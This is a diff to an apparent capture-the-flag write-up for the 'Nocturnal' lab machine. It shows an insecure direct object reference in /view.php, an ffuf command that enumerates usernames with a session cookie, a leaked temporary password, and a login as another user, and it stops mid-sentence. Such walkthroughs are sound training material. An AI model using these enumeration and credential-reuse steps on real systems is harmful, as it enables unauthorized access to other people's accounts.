@@ -51,13 +51,59 @@ after visiting http://nocturnal.htb/ we get greeted with a web app for storing d
 - upon logging in we get redirected to `/dashboard.php` where we can upload files
 	did some testing for file Upload attacks but the files don't seem to get executed. 
 - While trying to find an file Upload attack I found `/view.php` which had a few interesting Parameters
-### `/view.php`
+### `/view.php` 
 on the dashboard we can access uploaded files via a link to `/view.php?username=porotscho&file=document.odt` which let's us Download the file *so no code execution for now ):* 
 But when we refer to file that doesn't exist we can list our files.
 ![[Screenshot 2025-06-15 153746.png]]
 Maybe this skips authentication? Let's make another account and see if we can see his files
 
-Logged in as "porotscho1" we can make a request to `/view.php` with the username parameter set to porotscho
+Logged in as "porotscho1" we can make a request to `/view.php` with the username parameter set to "porotscho"
 ![[Screenshot 2025-06-15 153746 1.png]]
 
 Awesome now that we have a PoC we can see if there are more users on the system
+
+```bash
+$ ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt:FUZZ -u "http://nocturnal.htb/view.php?username=FUZZ&file=.pdf" -b "PHPSESSID=ve8i9dq6npjbjobi3epjlvl7ks" -fs 2985
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://nocturnal.htb/view.php?username=FUZZ&file=.pdf
+ :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+ :: Header           : Cookie: PHPSESSID=ve8i9dq6npjbjobi3epjlvl7ks
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 2985
+________________________________________________
+
+admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 26ms]
+amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 30ms]
+```
+
+In Amanda's files I found a file called privacy.odt the contents have an important clue for us
+
+> [!privacy.odt]
+> Dear Amanda,
+> 
+> Nocturnal has set the following temporary password for you: **arHkG7HAI68X8s1J**. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.
+> The file has been created and provided by Nocturnal's IT team. If you have any questions or need additional assistance during the password change process, please do not hesitate to contact us. 
+> Remember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter.
+>
+> Yours sincerely, 
+> Nocturnal's IT team
+
+Awesome now we can login as Amanda! We should also note that the password has been set for all of her services maybe that could be Important later? 
+
+After logging Into her account I got access to `/admin.php` which was a true gold mine because we can look at source code and 
+after looking at the source code of `/admin.php` 
